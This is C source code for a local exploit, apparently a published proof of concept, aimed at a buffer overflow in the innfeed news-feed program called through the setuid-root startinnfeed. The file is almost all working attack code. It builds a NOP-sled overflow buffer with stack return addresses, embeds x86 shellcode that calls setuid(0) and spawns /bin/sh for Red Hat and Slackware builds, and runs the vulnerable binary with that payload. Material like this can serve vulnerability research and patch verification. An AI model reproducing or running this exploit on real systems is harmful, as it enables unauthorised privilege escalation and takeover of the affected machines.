/*
  x-innfeed.c

  Buffer overflow in innfeed being called from startinnfeed renders
uid(news) gid(news), startinnfeed is suid root so I have to also check
if I can manage to get root out of this ....

  Enrique A. Sanchez Montellano
  (@defcom.com ... Yes is only @defcom.com)
*/

#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <stdlib.h>

#define OFFSET  0
#define ALIGN   0
#define BUFFER  470

// MANDRAKE, REDHAT, etc....

#ifdef REDHAT
/* optimized shellcode ;) (got rid of 2 bytes from aleph1's) */
//static char shellcode[]=
//"\xeb\x15\x5b\x89\x5b\x08\x31\xc0\x88\x43\x07\x89\x43\x0c\xb0\x0b\x8d\x4b\x08\x31\xd2\xcd\x80\xe8\xe6\xff\xff\xff/bin/sh";
char shellcode[] = "\x31\xdb\x89\xd8\xb0\x17\xcd\x80" /*setuid(0) */
             "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c"
             "\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb"
             "\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh";

#endif

#ifdef SLACKWARE
/* optimized shellcode for slackware 7.0 (non setuid(getuid()) shell) */
static char shellcode[]=
"\xeb\x15\x5b\x89\x5b\x0b\x31\xc0\x88\x43\x0a\x89\x43\x0f\xb0\x0b\x8d\x4b\x0b\x31\xd2\xcd\x80\xe8\xe6\xff\xff\xff/bin/bash1";
#endif

unsigned long get_sp(void) {
  __asm__("movl %esp, %eax");
}

void usage(char *name) {
  printf("Usage: %s <offset> <align> <buffer>\n", name);
  printf("Defcom Labs @ Spain ...\n");
  printf("Enrique A. Sanchez Montellano (@defcom.com)\n");
  exit(0);
}

int main(int argc, char **argv) {
  char *code;
  int offset = OFFSET;
  int align = ALIGN;
  int buffer = BUFFER;
  unsigned long addr;
  int i;

  if(argc > 1) offset = atoi(argv[1]);
  if(argc > 2) align = atoi(argv[2]);
  if(argc > 3) buffer = atoi(argv[3]);

  code = (char *)malloc(buffer);

  printf("[ + ] innfeed buffer overflow (passed to startinnfeed) [ + ]\n");
  printf("------------------------------------------------------------\n");
  printf("[ + ] Found by: \n\n[ + ] Alex Hernandez
(alex.hernandez@defcom.com) \n[ + ] Enrique Sanchez (@defcom.com ... Yes
is just @defcom.com)\n");
  printf("[ + ] Defcom Labs @ Spain ....\n");
  printf("[ + ] Coded by Enrique A. Sanchez Montellano (El Nahual)\n\n");

  addr = get_sp() - offset;

  printf("[ + ] Using address 0x%x\n", addr);

  for(i = 0; i <= buffer; i += 4) {
   *(long *)&code[i] = 0x90909090;
  }

  *(long *)&code[buffer - 4] = addr;
  *(long *)&code[buffer - 8] = addr;

  memcpy(code + buffer - strlen(shellcode) -8 - align, shellcode,
strlen(shellcode));

  printf("[ + ] Starting exploitation ... \n\n");

  // REDHAT, MANDRAKE ...
#ifdef REDHAT
  execl("/usr/bin/startinnfeed", "/usr/bin/startinnfeed", "-c", code, NULL);
#endif

  // SLACKWARE
#ifdef SLACKWARE
  execl("/usr/lib/news/bin/startinnfeed",
"/usr/lib/news/bin/startinnfeed", "-c", code, NULL);
#endif

  return 0;
}
